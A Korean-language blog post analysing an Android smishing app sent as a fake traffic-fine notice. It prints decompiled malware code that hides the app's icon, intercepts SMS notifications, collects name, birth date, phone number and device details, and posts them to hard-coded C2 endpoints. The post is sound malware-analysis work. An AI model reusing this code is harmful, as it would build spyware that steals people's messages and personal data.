---
title: "Android Malware Analysis"
dateString: June 2025
draft: false
tags: ["malware", "Android malware"]
weight: 30
date: 2025-06-17
categories: ["Malware"]
---

# Overview
![](/blog/gojiseo/Screenshot_20250617_153131_Messages.jpg)

운전면허도 없는데, 고지서가 발부되었다길래 궁금해서 분석해보았다.
잠깐 본거라 분석은 많이 안했는데, 중요한건 대충 다 한 것 같다.

미리 요약하자면 이 앱은 통신사, 전화번호, 폰 모델명 같은 것들을 탈취해서 `173.234.30.133`로 열심히 보내고 문자 메세지 내용이나 타이틀을 수집해서 그대로 서버로 보낸다.
또한 앱을 키면, 대놓고 이름과 생년월일도 친절하게 묻는다.

C2 서버에 접속해보면 저렇게 admin page를 열어두고 있다.
![](/blog/gojiseo/image.png)

저기뿐만 아니라 `74.121.188.19` 같은 곳에서도 같은 페이지가 열려있다.
![](/blog/gojiseo/image-1.png)

sms-serverV2-name_password 라는 laravel로 만든 자기들만의 php 프로젝트로 보인다.

![](/blog/gojiseo/image-2.png)

앱에서 분석한 엔드포인트에 들어가보면 이런식으로 stack trace도 보여준다. ㅋㅋ
뭔가 취약점 많을 것 같이 생겼지만 원래 목적에는 벗어난다.
# Analysis
```java
    [...]
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"/>
    [...]
        <activity-alias android:label="." android:icon="@android:color/transparent" android:name="com.sagm.zwclfwip.VgBq" android:enabled="false" android:exported="true" android:targetActivity="com.sagm.zwclfwip.VgBq">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity-alias>
        [...]
        <service android:label="@string/app_name" android:name="com.sagm.zwclfwip.spWRVMyKFJ.EmIyzOjRW" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" android:exported="false">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService"/>
            </intent-filter>
        </service>
    [...]
```
되게 악랄하게 투명 색깔을 선택하고 있다.
이 앱 자체는 적당히 난독화 되어 있긴 하지만 기능이 간단해서 분석하기 쉽다.
## NotificationListenerServic - updateUserMsg
사실 이 리스너가 주요한 기능인 것으로 보인다.
`android.permission.BIND_NOTIFICATION_LISTENER_SERVICE`가 허용되어 있어야 동작해서 처음에 main activity에서 권한 허용해달라고 요청한다.
```java
    public final void onNotificationPosted(StatusBarNotification sbn) {
        string.copy(sbn, "sbn");
        super.onNotificationPosted(sbn);
        String packageName = sbn.getPackageName();
        if (string.requals(packageName, "com.android.mms") || string.requals(packageName, "com.samsung.android.messaging") || string.requals(packageName, "com.google.android.apps.messaging")) {
            Bundle bundle = sbn.getNotification().extras;
            String title = bundle.getString(NotificationCompat.EXTRA_TITLE);
            if (title == null) {
                title = "";
            }
            String string = bundle.getString(NotificationCompat.EXTRA_TEXT);
            String content = string != null ? string : "";
            if (ZHbVuIv.TEUYb("메세지", content) || ZHbVuIv.TEUYb("문자", content) || ZHbVuIv.TEUYb("sms", content)) {
                return;
            }
            long currentTimeMillis = System.currentTimeMillis();
            String msg = "收到短信通知: 标题=" + title + ", 内容=" + content; // "문자 메시지 알림 수신: 제목=", ", 내용="
            string.copy(msg, "msg");
            CustomLogger.log(3, "SmsNotificationListener", msg, null);
            Map pack_data = mSzUY.pack_data(new XZD.ZHbVuIv("description", content), new XZD.ZHbVuIv("type", 1), new XZD.ZHbVuIv("phone", title), new XZD.ZHbVuIv("send_time", Long.valueOf(currentTimeMillis)), new XZD.ZHbVuIv("id", -1), new XZD.ZHbVuIv("is_color", 0));
            JSONArray jSONArray = new JSONArray();
            jSONArray.put(new JSONObject(pack_data));
            String jSONArray2 = jSONArray.toString();
            string.call(jSONArray2, "toString(...)");
            MMKV mmkv = GfKxQHQ.wmbNnZ;
            if (mmkv == null) {
                string.wiX("mainMMKV");
                throw null;
            }
            String decodeString = mmkv.decodeString("uuid");
            if (decodeString == null || decodeString.length() == 0) {
                decodeString = UUID.randomUUID().toString();
                string.call(decodeString, "toString(...)");
                MMKV mmkv2 = GfKxQHQ.wmbNnZ;
                if (mmkv2 == null) {
                    string.wiX("mainMMKV");
                    throw null;
                }
                mmkv2.encode("uuid", decodeString);
            }
            Map pack_data2 = mSzUY.pack_data(new XZD.ZHbVuIv("uuid", decodeString), new XZD.ZHbVuIv("data", jSONArray2));
            FftZ fftZ = FHL.ifwfG;
            FHL.SEND(C2_URL_GEN.update_user_msg, pack_data2, new AwNbFoW.ZHbVuIv(2)); // SEND
            AwNbFoW.ZHbVuIv.ifwfG();
    [...]
```
EmIyzOjRW 클래스는 이런식으로 문자 메세지를 열심히 기록한다.
문자 title, content를 분리해서 중국어로 로그를 찍는 것을 확인할 수 있다.
title 같은데 발신자 정보가 들어가니까 그걸로 주변 사람들의 전화번호를 수집하려는 목적도 있어 보인다.
각자 폰마다 uuid를 부여해서 C2 서버로 보내는 것을 확인할 수 있다.
```java
package GNXEC;

import nvf.HRhLr;

/* renamed from: GNXEC.FHL */
/* loaded from: classes.dex */
public abstract class C2_URL_GEN {

    /* renamed from: EKRSx */
    public static final String update_user_msg;

    /* renamed from: RhN */
    public static final String update_user_notes;

    /* renamed from: ifwfG */
    public static final String update_user_long;

    static {
        String obj = nvf.ZHbVuIv.HkbDkTL("http://173.234.30.133").toString();
        if (!HRhLr.Aztjigt(obj, "http://", false) && !HRhLr.Aztjigt(obj, "https://", false)) {
            obj = "http://".concat(obj);
        }
        if (!HRhLr.mgA(obj, "/")) {
            obj = obj.concat("/");
        }
        update_user_long = QFMtNe.GfKxQHQ.UMEwxCp(obj, "updateUserLong");
        update_user_notes = QFMtNe.GfKxQHQ.UMEwxCp(obj, "updateUserNotes");
        update_user_msg = QFMtNe.GfKxQHQ.UMEwxCp(obj, "updateUserMsg");
    }
```
이게 C2랑 통신하기 전에 URL을 만드는 클래스이다.
message listener 등록된거에서 수집된 정보는 updateUserMsg 엔드포인트로 POST로 날아간다.
## MainActivity
### updateUserNotes
```java
@Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        EdgeToEdge.enable$default(this, null, null, 3, null);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), new GfKxQHQ(10));
        ((Button) findViewById(R.id.nkzagw)).setOnClickListener(new okn(this, 1));
    }
```
클릭 리스너를 등록한다.
```java
            } else {
                try {
                    ((FrameLayout) mainActivity.findViewById(R.id.egaqflmvpsuwvv)).setVisibility(0);
                } catch (Exception unused) {
                }
                if (GNXEC.GfKxQHQ.RhN()) {
                    Map map = AwNbFoW.ZHbVuIv.get_user_data();
                    Map pack_data = mSzUY.pack_data(new XZD.ZHbVuIv("name", NAME), new XZD.ZHbVuIv("birth", BIRTH));
                    LinkedHashMap linkedHashMap = new LinkedHashMap(map);
                    linkedHashMap.putAll(pack_data);
                    FftZ fftZ = sjR.FHL.ifwfG;
                    sjR.FHL.SEND(C2_URL_GEN.update_user_notes, linkedHashMap, new AwNbFoW.ZHbVuIv(3));
                    return;
                }
                return;
            }
```
birth 길이가 6글자 이상인 것만 받도록 되어 있는데, 위와 같이 이름이랑 생년월일 수집해서 updateUserNotes 엔드포인트로 보낸다.
### updateUserLong
```java
public final void onResume() {
    super.onResume();
    [...]
        TiVm tiVm2 = TiVm.ifwfG;
        if (jhLoO.okn.GAfXIJ(FHL.wiX())) { // notification listener ON or OFF?
            getPackageManager().setComponentEnabledSetting(new ComponentName(this, EmIyzOjRW.class), 1, 1);
            if (GNXEC.GfKxQHQ.RhN()) {
                Map map = ZHbVuIv.get_user_data();
                FftZ fftZ = sjR.FHL.ifwfG;
                sjR.FHL.SEND(C2_URL_GEN.update_user_long, map, new ZHbVuIv(1));
            }
            this.ifwfG = true;
            CGLZX();
            return;
        }
        String string = getString(R.string.app_name);
        string.call(string, "getString(...)");
        if (jhLoO.okn.GAfXIJ(this)) {
            return;
        }
        Toast.makeText(this, string.concat("을 찾아 알림 접근을 허용해 주세요."), 1).show();
        Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
        intent.setFlags(268435456);
        startActivity(intent);
    }
```
여기서 중요한건 `get_user_data`로 라벨링 해놓은 메소드이다.
```java
public static Map get_user_data() {
    [...]
    XZD.ZHbVuIv zHbVuIv = new XZD.ZHbVuIv("uuid", decodeString);
    XZD.ZHbVuIv zHbVuIv2 = new XZD.ZHbVuIv("number", GNXEC.GfKxQHQ.ifwfG());
    if (GNXEC.GfKxQHQ.sUJ.length() == 0) {
        TiVm tiVm = TiVm.ifwfG;
        Object systemService = VqO.FHL.wiX().getSystemService("phone");
        string.EKRSx(systemService, "null cannot be cast to non-null type android.telephony.TelephonyManager");
        GNXEC.GfKxQHQ.sUJ = ((TelephonyManager) systemService).getNetworkOperatorName();
    }
    XZD.ZHbVuIv zHbVuIv3 = new XZD.ZHbVuIv("operator", GNXEC.GfKxQHQ.sUJ);
    String MODEL = Build.MODEL;
    string.call(MODEL, "MODEL");
    XZD.ZHbVuIv zHbVuIv4 = new XZD.ZHbVuIv("phone_type", MODEL);
    String[] strArr = GNXEC.GfKxQHQ.RhN;
    int i3 = 0;
    while (true) {
        if (i3 >= 2) {
            i = 1;
            break;
        }
        String str = strArr[i3];
        TiVm tiVm2 = TiVm.ifwfG;
        if (ContextCompat.checkSelfPermission(VqO.FHL.wiX(), str) != 0) {
            i = 0;
            break;
        }
        i3++;
    }
    XZD.ZHbVuIv zHbVuIv5 = new XZD.ZHbVuIv("phone", Integer.valueOf(i));
    TiVm tiVm3 = TiVm.ifwfG;
    XZD.ZHbVuIv zHbVuIv6 = new XZD.ZHbVuIv("sms", Integer.valueOf(okn.GAfXIJ(VqO.FHL.wiX()) ? 1 : 0));
    XZD.ZHbVuIv zHbVuIv7 = new XZD.ZHbVuIv("contacts", 0);
    XZD.ZHbVuIv zHbVuIv8 = new XZD.ZHbVuIv("image", 0);
    Object systemService2 = VqO.FHL.wiX().getSystemService("connectivity");
    string.EKRSx(systemService2, "null cannot be cast to non-null type android.net.ConnectivityManager");
    ConnectivityManager connectivityManager = (ConnectivityManager) systemService2;
    if (connectivityManager.isActiveNetworkMetered() && connectivityManager.getRestrictBackgroundStatus() == 3) {
        i2 = 0;
    }
    XZD.ZHbVuIv zHbVuIv9 = new XZD.ZHbVuIv("empower", mSzUY.pack_data(zHbVuIv5, zHbVuIv6, zHbVuIv7, zHbVuIv8, new XZD.ZHbVuIv("network", Integer.valueOf(i2)), new XZD.ZHbVuIv("accessibility", 0), new XZD.ZHbVuIv(NotificationCompat.CATEGORY_MESSAGE, 0), new XZD.ZHbVuIv("battery", 0)));
    String RELEASE = Build.VERSION.RELEASE;
    string.call(RELEASE, "RELEASE");
    return mSzUY.pack_data(zHbVuIv, zHbVuIv2, zHbVuIv3, zHbVuIv4, zHbVuIv9, new XZD.ZHbVuIv("android_v", RELEASE));
}
```
READ_PHONE_STATE 같은 권한이 있으면 전화번호도 읽고, 기기 모델명 같은 여러 정보들을 수집한다.
전화번호도 가공하는 함수들을 보면 010, 011, 016 이런 prefix 가진 애들을 걸러서 저장하는 것 같다.
updateUserLong 엔드포인트로 보내지는 것을 확인할 수 있다.